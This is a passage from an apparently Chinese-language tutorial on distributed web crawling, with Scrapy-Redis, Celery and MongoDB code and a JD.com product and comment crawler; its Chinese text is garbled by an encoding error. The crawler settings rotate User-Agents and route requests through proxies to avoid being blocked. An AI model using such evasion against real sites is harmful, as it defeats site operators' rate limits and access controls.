            <span class="n">mongo_uri</span><span class="o">=</span><span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;MONGODB_URI&#39;</span><span class="p">),</span>
            <span class="n">mongo_db</span><span class="o">=</span><span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;MONGODB_DATABASE&#39;</span><span class="p">)</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">open_spider</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">client</span> <span class="o">=</span> <span class="n">pymongo</span><span class="o">.</span><span class="n">MongoClient</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">mongo_uri</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">db</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">mongo_db</span><span class="p">]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">close_spider</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_item</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">item</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="n">collection</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">db</span><span class="p">[</span><span class="n">spider</span><span class="o">.</span><span class="n">name</span><span class="p">]</span>
        <span class="n">item_dict</span> <span class="o">=</span> <span class="n">ItemAdapter</span><span class="p">(</span><span class="n">item</span><span class="p">)</span><span class="o">.</span><span class="n">asdict</span><span class="p">()</span>
        <span class="n">collection</span><span class="o">.</span><span class="n">update_one</span><span class="p">(</span>
            <span class="p">{</span><span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">item_dict</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]},</span>
            <span class="p">{</span><span class="s1">&#39;$set&#39;</span><span class="p">:</span> <span class="n">item_dict</span><span class="p">},</span>
            <span class="n">upsert</span><span class="o">=</span><span class="kc">True</span>
        <span class="p">)</span>
        <span class="k">return</span> <span class="n">item</span>
</code></pre>
      </div>

      <p><strong>éƒ¨ç½²å’Œè¿è¡Œï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># åœ¨æœºå™¨ A å¯åŠ¨çˆ¬è™«</span>
scrapy<span class="w"> </span>crawl<span class="w"> </span>example

<span class="c1"># åœ¨æœºå™¨ B å¯åŠ¨çˆ¬è™«</span>
scrapy<span class="w"> </span>crawl<span class="w"> </span>example

<span class="c1"># åœ¨æœºå™¨ C å¯åŠ¨çˆ¬è™«</span>
scrapy<span class="w"> </span>crawl<span class="w"> </span>example

<span class="c1"># æ·»åŠ èµ·å§‹ URLï¼ˆåœ¨ä»»æ„æœºå™¨ï¼‰</span>
redis-cli<span class="w"> </span>-h<span class="w"> </span>redis.example.com<span class="w"> </span>-a<span class="w"> </span>yourpassword<span class="w"> </span>lpush<span class="w"> </span>example:start_urls<span class="w"> </span><span class="s2">&quot;http://example.com&quot;</span>
redis-cli<span class="w"> </span>-h<span class="w"> </span>redis.example.com<span class="w"> </span>-a<span class="w"> </span>yourpassword<span class="w"> </span>lpush<span class="w"> </span>example:start_urls<span class="w"> </span><span class="s2">&quot;http://example.com/page1&quot;</span>
redis-cli<span class="w"> </span>-h<span class="w"> </span>redis.example.com<span class="w"> </span>-a<span class="w"> </span>yourpassword<span class="w"> </span>lpush<span class="w"> </span>example:start_urls<span class="w"> </span><span class="s2">&quot;http://example.com/page2&quot;</span>

<span class="c1"># æŸ¥çœ‹é˜Ÿåˆ—çŠ¶æ€</span>
redis-cli<span class="w"> </span>-h<span class="w"> </span>redis.example.com<span class="w"> </span>-a<span class="w"> </span>yourpassword<span class="w"> </span>llen<span class="w"> </span>example:requests
redis-cli<span class="w"> </span>-h<span class="w"> </span>redis.example.com<span class="w"> </span>-a<span class="w"> </span>yourpassword<span class="w"> </span>scard<span class="w"> </span>example:dupefilter
</code></pre>
      </div>

      <h3 id="ç¤ºä¾‹2celery-å¼‚æ­¥çˆ¬è™«">ç¤ºä¾‹2ï¼šCelery å¼‚æ­¥çˆ¬è™«</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># tasks.py</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">celery</span><span class="w"> </span><span class="kn">import</span> <span class="n">Celery</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">bs4</span><span class="w"> </span><span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Celery</span><span class="p">(</span><span class="s1">&#39;crawler&#39;</span><span class="p">,</span>
             <span class="n">broker</span><span class="o">=</span><span class="s1">&#39;redis://localhost:6379/0&#39;</span><span class="p">,</span>
             <span class="n">backend</span><span class="o">=</span><span class="s1">&#39;redis://localhost:6379/0&#39;</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">task</span><span class="p">(</span><span class="n">bind</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">max_retries</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">crawl_url</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;çˆ¬å–å•ä¸ª URL&quot;&quot;&quot;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
        <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>

        <span class="c1"># æå–æ•°æ®</span>
        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">url</span><span class="p">,</span>
            <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;h1&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span> <span class="k">if</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;h1&#39;</span><span class="p">)</span> <span class="k">else</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
            <span class="s1">&#39;links&#39;</span><span class="p">:</span> <span class="p">[</span><span class="n">a</span><span class="p">[</span><span class="s1">&#39;href&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">href</span><span class="o">=</span><span class="kc">True</span><span class="p">)]</span>
        <span class="p">}</span>

        <span class="c1"># å­˜å‚¨æ•°æ®</span>
        <span class="n">save_to_database</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

        <span class="c1"># æäº¤æ–°çš„çˆ¬å–ä»»åŠ¡</span>
        <span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;links&#39;</span><span class="p">][:</span><span class="mi">10</span><span class="p">]:</span>  <span class="c1"># é™åˆ¶æ¯é¡µæœ€å¤šæå– 10 ä¸ªé“¾æ¥</span>
            <span class="n">crawl_url</span><span class="o">.</span><span class="n">apply_async</span><span class="p">(</span><span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="n">link</span><span class="p">],</span> <span class="n">countdown</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">data</span>

    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">exc</span><span class="p">:</span>
        <span class="c1"># å¤±è´¥å 60 ç§’é‡è¯•</span>
        <span class="k">raise</span> <span class="bp">self</span><span class="o">.</span><span class="n">retry</span><span class="p">(</span><span class="n">exc</span><span class="o">=</span><span class="n">exc</span><span class="p">,</span> <span class="n">countdown</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">save_to_database</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ä¿å­˜æ•°æ®åˆ°æ•°æ®åº“&quot;&quot;&quot;</span>
    <span class="c1"># å®ç°æ•°æ®å­˜å‚¨é€»è¾‘</span>
    <span class="k">pass</span>
</code></pre>
      </div>

      <p><strong>è¿è¡Œï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å¯åŠ¨å¤šä¸ª Worker</span>
celery<span class="w"> </span>-A<span class="w"> </span>tasks<span class="w"> </span>worker<span class="w"> </span>--loglevel<span class="o">=</span>info<span class="w"> </span>--concurrency<span class="o">=</span><span class="m">10</span>

<span class="c1"># æäº¤ä»»åŠ¡</span>
python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;from tasks import crawl_url; crawl_url.delay(&#39;http://example.com&#39;)&quot;</span>

<span class="c1"># ç›‘æ§</span>
celery<span class="w"> </span>-A<span class="w"> </span>tasks<span class="w"> </span>flower
<span class="c1"># è®¿é—® http://localhost:5555</span>
</code></pre>
      </div>

      <h3 id="ç¤ºä¾‹3çœŸå®æ¡ˆä¾‹-äº¬ä¸œå•†å“ä¿¡æ¯åˆ†å¸ƒå¼çˆ¬è™«">ç¤ºä¾‹3ï¼šçœŸå®æ¡ˆä¾‹ - äº¬ä¸œå•†å“ä¿¡æ¯åˆ†å¸ƒå¼çˆ¬è™«</h3>

      <p><strong>é¡¹ç›®èƒŒæ™¯</strong>ï¼šæŸæ•°æ®åˆ†æå…¬å¸éœ€è¦é‡‡é›†äº¬ä¸œå¹³å°ä¸Šç‰¹å®šç±»ç›®ï¼ˆå¦‚å›¾ä¹¦ã€ç”µå­äº§å“ï¼‰çš„å•†å“ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä»·æ ¼ã€è¯„è®ºã€é”€é‡ç­‰æ•°æ®ï¼Œç”¨äºå¸‚åœºåˆ†æå’Œä»·æ ¼ç›‘æ§ã€‚æ•°æ®è§„æ¨¡ï¼šçº¦ 500 ä¸‡å•†å“ï¼Œ1 äº¿+è¯„è®ºã€‚</p>

      <h4 id="æ¶æ„è®¾è®¡">æ¶æ„è®¾è®¡</h4>

      <p><strong>ç³»ç»Ÿæ¶æ„</strong>ï¼š</p>

      <pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Master èŠ‚ç‚¹  â”‚
â”‚  (Redis)     â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ ä»»åŠ¡é˜Ÿåˆ—  â”‚ â”‚
â”‚ â”‚ å»é‡é›†åˆ  â”‚ â”‚
â”‚ â”‚ BloomFilterâ”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜
       â”‚
   â”Œâ”€â”€â”€â”´â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”
   â†“        â†“        â†“        â†“
â”Œâ”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”
â”‚Slave1â”‚  â”‚Slave2â”‚  â”‚Slave3â”‚  â”‚SlaveNâ”‚
â”‚çˆ¬è™«èŠ‚ç‚¹â”‚ â”‚çˆ¬è™«èŠ‚ç‚¹â”‚ â”‚çˆ¬è™«èŠ‚ç‚¹â”‚ â”‚çˆ¬è™«èŠ‚ç‚¹â”‚
â””â”€â”€â”¬â”€â”€â”˜  â””â”€â”€â”¬â”€â”€â”˜  â””â”€â”€â”¬â”€â”€â”˜  â””â”€â”€â”¬â”€â”€â”˜
   â”‚        â”‚        â”‚        â”‚
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â†“
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚   MongoDB    â”‚
        â”‚  (æ•°æ®å­˜å‚¨)   â”‚
        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>

      <h4 id="æ€§èƒ½æŒ‡æ ‡">æ€§èƒ½æŒ‡æ ‡</h4>

      <p>é€šè¿‡åˆ†å¸ƒå¼æ¶æ„å®ç°äº†æ˜¾è‘—çš„æ€§èƒ½æå‡ï¼š</p>

      <ul>
        <li><strong>çˆ¬å–é€Ÿåº¦</strong>ï¼šä»å•æœº 1.5 å°æ—¶é™ä½åˆ° 10 åˆ†é’Ÿï¼ˆ9x æå‡ï¼‰</li>
        <li><strong>å¹¶å‘å¤„ç†</strong>ï¼š4 ä¸ªçˆ¬è™«èŠ‚ç‚¹ï¼Œæ¯èŠ‚ç‚¹ 16 å¹¶å‘ï¼Œæ€»è®¡ 64 å¹¶å‘è¯·æ±‚</li>
        <li><strong>å»é‡æ•ˆç‡</strong>ï¼šä½¿ç”¨ Bloom Filterï¼Œ1 äº¿ URL ä»…å ç”¨ 128 MB å†…å­˜</li>
        <li><strong>ç¡¬ä»¶åˆ©ç”¨ç‡</strong>ï¼šè¾¾åˆ° 85%+ çš„ CPU åˆ©ç”¨ç‡</li>
        <li><strong>æ€»å¤„ç†é‡</strong>ï¼š40x+ çš„å¤„ç†èƒ½åŠ›æå‡ï¼ˆç›¸æ¯”å•æœºï¼‰</li>
      </ul>

      <h4 id="å®ç°ä»£ç ">å®ç°ä»£ç </h4>

      <p><strong>settings.py é…ç½®</strong>ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># Scrapy-Redis åˆ†å¸ƒå¼é…ç½®</span>
<span class="n">SCHEDULER</span> <span class="o">=</span> <span class="s2">&quot;scrapy_redis.scheduler.Scheduler&quot;</span>
<span class="n">DUPEFILTER_CLASS</span> <span class="o">=</span> <span class="s2">&quot;scrapy_redis_bloomfilter.dupefilter.RFPDupeFilter&quot;</span>

<span class="c1"># BloomFilter é…ç½®ï¼ˆé€‚é…äº¿çº§æ•°æ®ï¼‰</span>
<span class="n">BLOOMFILTER_HASH_NUMBER</span> <span class="o">=</span> <span class="mi">7</span>
<span class="n">BLOOMFILTER_BIT</span> <span class="o">=</span> <span class="mi">33</span>  <span class="c1"># 2^33ï¼Œæ”¯æŒ 10 äº¿+ URL</span>

<span class="c1"># Redis ä¸»èŠ‚ç‚¹é…ç½®</span>
<span class="n">REDIS_HOST</span> <span class="o">=</span> <span class="s1">&#39;192.168.1.100&#39;</span>
<span class="n">REDIS_PORT</span> <span class="o">=</span> <span class="mi">6379</span>
<span class="n">REDIS_PARAMS</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;your_redis_password&#39;</span><span class="p">,</span>
    <span class="s1">&#39;db&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
    <span class="s1">&#39;socket_keepalive&#39;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
    <span class="s1">&#39;max_connections&#39;</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span>
<span class="p">}</span>

<span class="c1"># æŒä¹…åŒ–é…ç½®ï¼ˆæ”¯æŒæ–­ç‚¹ç»­çˆ¬ï¼‰</span>
<span class="n">SCHEDULER_PERSIST</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">SCHEDULER_QUEUE_KEY</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%(spider)s</span><span class="s1">:requests&#39;</span>
<span class="n">SCHEDULER_DUPEFILTER_KEY</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%(spider)s</span><span class="s1">:dupefilter&#39;</span>

<span class="c1"># Pipeline é…ç½®</span>
<span class="n">ITEM_PIPELINES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;jd_crawler.pipelines.MongoDBPipeline&#39;</span><span class="p">:</span> <span class="mi">300</span><span class="p">,</span>
    <span class="s1">&#39;jd_crawler.pipelines.ImageDownloadPipeline&#39;</span><span class="p">:</span> <span class="mi">400</span><span class="p">,</span>
<span class="p">}</span>

<span class="c1"># MongoDB é…ç½®</span>
<span class="n">MONGODB_URI</span> <span class="o">=</span> <span class="s1">&#39;mongodb://192.168.1.101:27017&#39;</span>
<span class="n">MONGODB_DATABASE</span> <span class="o">=</span> <span class="s1">&#39;jd_products&#39;</span>
<span class="n">MONGODB_COLLECTION</span> <span class="o">=</span> <span class="s1">&#39;products&#39;</span>

<span class="c1"># å¹¶å‘å’Œå»¶è¿Ÿé…ç½®</span>
<span class="n">CONCURRENT_REQUESTS</span> <span class="o">=</span> <span class="mi">64</span>            <span class="c1"># æ€»å¹¶å‘æ•°</span>
<span class="n">CONCURRENT_REQUESTS_PER_DOMAIN</span> <span class="o">=</span> <span class="mi">16</span>  <span class="c1"># å•åŸŸåå¹¶å‘</span>
<span class="n">DOWNLOAD_DELAY</span> <span class="o">=</span> <span class="mf">0.2</span>                <span class="c1"># ä¸‹è½½å»¶è¿Ÿ</span>
<span class="n">RANDOMIZE_DOWNLOAD_DELAY</span> <span class="o">=</span> <span class="kc">True</span>     <span class="c1"># éšæœºåŒ–å»¶è¿Ÿ</span>

<span class="c1"># è‡ªåŠ¨é™é€Ÿï¼ˆé˜²æ­¢è¢«å°ï¼‰</span>
<span class="n">AUTOTHROTTLE_ENABLED</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">AUTOTHROTTLE_START_DELAY</span> <span class="o">=</span> <span class="mf">0.5</span>
<span class="n">AUTOTHROTTLE_MAX_DELAY</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">AUTOTHROTTLE_TARGET_CONCURRENCY</span> <span class="o">=</span> <span class="mf">16.0</span>

<span class="c1"># User-Agent è½®æ¢</span>
<span class="n">DOWNLOADER_MIDDLEWARES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;scrapy.downloadermiddlewares.useragent.UserAgentMiddleware&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
    <span class="s1">&#39;jd_crawler.middlewares.RandomUserAgentMiddleware&#39;</span><span class="p">:</span> <span class="mi">400</span><span class="p">,</span>
    <span class="s1">&#39;jd_crawler.middlewares.ProxyMiddleware&#39;</span><span class="p">:</span> <span class="mi">410</span><span class="p">,</span>
<span class="p">}</span>

<span class="c1"># Cookies é…ç½®</span>
<span class="n">COOKIES_ENABLED</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">COOKIES_DEBUG</span> <span class="o">=</span> <span class="kc">False</span>
</code></pre>
      </div>

      <p><strong>spiders/jd_spider.py çˆ¬è™«å®ç°</strong>ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">scrapy_redis.spiders</span><span class="w"> </span><span class="kn">import</span> <span class="n">RedisSpider</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">jd_crawler.items</span><span class="w"> </span><span class="kn">import</span> <span class="n">ProductItem</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>

<span class="k">class</span><span class="w"> </span><span class="nc">JDSpider</span><span class="p">(</span><span class="n">RedisSpider</span><span class="p">):</span>
    <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;jd&#39;</span>
    <span class="n">redis_key</span> <span class="o">=</span> <span class="s1">&#39;jd:start_urls&#39;</span>

    <span class="c1"># å…è®¸çš„åŸŸå</span>
    <span class="n">allowed_domains</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;jd.com&#39;</span><span class="p">,</span> <span class="s1">&#39;3.cn&#39;</span><span class="p">]</span>

    <span class="n">custom_settings</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;DEPTH_LIMIT&#39;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span>  <span class="c1"># æœ€å¤§çˆ¬å–æ·±åº¦</span>
    <span class="p">}</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è§£æå•†å“åˆ—è¡¨é¡µ&quot;&quot;&quot;</span>
        <span class="c1"># æå–å•†å“é“¾æ¥</span>
        <span class="n">product_links</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">css</span><span class="p">(</span><span class="s1">&#39;div.gl-i-wrap div.p-img a::attr(href)&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">getall</span><span class="p">()</span>

        <span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">product_links</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">link</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">):</span>
                <span class="n">link</span> <span class="o">=</span> <span class="s1">&#39;https:&#39;</span> <span class="o">+</span> <span class="n">link</span>
            <span class="k">yield</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">link</span><span class="p">,</span> <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">parse_product_detail</span><span class="p">)</span>

        <span class="c1"># ç¿»é¡µ</span>
        <span class="n">next_page</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">css</span><span class="p">(</span><span class="s1">&#39;a.pn-next::attr(href)&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">next_page</span><span class="p">:</span>
            <span class="k">yield</span> <span class="n">response</span><span class="o">.</span><span class="n">follow</span><span class="p">(</span><span class="n">next_page</span><span class="p">,</span> <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">parse</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse_product_detail</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è§£æå•†å“è¯¦æƒ…é¡µ&quot;&quot;&quot;</span>
        <span class="n">item</span> <span class="o">=</span> <span class="n">ProductItem</span><span class="p">()</span>

        <span class="c1"># åŸºæœ¬ä¿¡æ¯</span>
        <span class="n">item</span><span class="p">[</span><span class="s1">&#39;product_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">extract_product_id</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
        <span class="n">item</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">url</span>
        <span class="n">item</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">css</span><span class="p">(</span><span class="s1">&#39;div.sku-name::text&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
        <span class="n">item</span><span class="p">[</span><span class="s1">&#39;brand&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">css</span><span class="p">(</span><span class="s1">&#39;ul#parameter-brand li a::text&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>

        <span class="c1"># ä»·æ ¼ä¿¡æ¯ï¼ˆéœ€è¦é¢å¤–è¯·æ±‚ï¼‰</span>
        <span class="n">price_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;https://p.3.cn/prices/mgets?skuIds=J_</span><span class="si">{</span><span class="n">item</span><span class="p">[</span><span class="s2">&quot;product_id&quot;</span><span class="p">]</span><span class="si">}</span><span class="s1">&#39;</span>
        <span class="k">yield</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span>
            <span class="n">price_url</span><span class="p">,</span>
            <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">parse_price</span><span class="p">,</span>
            <span class="n">meta</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;item&#39;</span><span class="p">:</span> <span class="n">item</span><span class="p">}</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse_price</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è§£æä»·æ ¼ä¿¡æ¯&quot;&quot;&quot;</span>
        <span class="n">item</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">meta</span><span class="p">[</span><span class="s1">&#39;item&#39;</span><span class="p">]</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
                <span class="n">item</span><span class="p">[</span><span class="s1">&#39;price&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;p&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
                <span class="n">item</span><span class="p">[</span><span class="s1">&#39;market_price&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">item</span><span class="p">[</span><span class="s1">&#39;price&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span>
            <span class="n">item</span><span class="p">[</span><span class="s1">&#39;market_price&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span>

        <span class="c1"># è¯„è®ºæ•°æ®ï¼ˆéœ€è¦é¢å¤–è¯·æ±‚ï¼‰</span>
        <span class="n">comment_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;https://club.jd.com/comment/productPageComments.action?productId=</span><span class="si">{</span><span class="n">item</span><span class="p">[</span><span class="s2">&quot;product_id&quot;</span><span class="p">]</span><span class="si">}</span><span class="s1">&amp;score=0&amp;sortType=5&amp;page=0&amp;pageSize=10&#39;</span>
        <span class="k">yield</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span>
            <span class="n">comment_url</span><span class="p">,</span>
            <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">parse_comment</span><span class="p">,</span>
            <span class="n">meta</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;item&#39;</span><span class="p">:</span> <span class="n">item</span><span class="p">}</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse_comment</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è§£æè¯„è®ºä¿¡æ¯&quot;&quot;&quot;</span>
        <span class="n">item</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">meta</span><span class="p">[</span><span class="s1">&#39;item&#39;</span><span class="p">]</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
            <span class="n">item</span><span class="p">[</span><span class="s1">&#39;comment_count&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;productCommentSummary&#39;</span><span class="p">,</span> <span class="p">{})</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;commentCount&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
